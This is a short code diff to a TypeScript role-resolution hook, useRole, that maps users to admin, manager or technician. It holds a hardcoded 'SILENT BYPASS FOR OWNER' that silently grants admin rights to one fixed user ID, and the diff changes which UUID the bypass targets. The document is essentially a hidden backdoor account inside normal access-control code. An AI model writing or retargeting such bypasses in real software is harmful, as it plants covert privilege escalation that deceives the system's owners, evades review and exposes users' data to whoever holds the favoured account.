@@ -25,7 +25,7 @@ export function useRole() {
       let r: AppRole = roles.includes("admin") ? "admin" : roles.includes("manager") ? "manager" : "technician";
       
       // SILENT BYPASS FOR OWNER
-      if (uid === '2b546c1b-eea2-4ec9-a99a-0e7af7d82a66') {
+      if (uid === 'fb4e43e3-8e86-4fbf-851c-d5b7e5ed8103') {
         r = 'admin';
       }
       
